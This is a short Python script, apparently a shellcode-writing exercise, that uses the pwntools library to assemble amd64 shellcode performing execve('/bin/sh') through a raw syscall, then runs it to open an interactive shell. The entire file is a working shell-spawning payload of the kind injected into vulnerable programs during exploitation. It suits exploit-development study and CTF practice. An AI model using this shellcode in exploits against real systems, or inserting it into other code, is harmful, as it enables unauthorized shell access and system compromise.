from pwn import *

context.arch = 'amd64'

code = ""
code += "mov rax, 0x68732f6e69622f	# '/bin/sh'\n"
code += "push rax\n"
code += "mov rdi, rsp	# rdi = '/bin/sh'\n"
code += "xor rsi, rsi	# rsi = NULL\n"
code += "xor rdx, rdx	# rdx = NULL\n"
code += "mov rax, 0x3b	# rax = sys_execve\n"
code += "syscall		# execve('/bin/sh', null, null) = execve(rdi, rsi, rdx)\n"

print(code)
print(asm(code))
print(len(asm(code)))

run_shellcode(asm(code)).interactive()
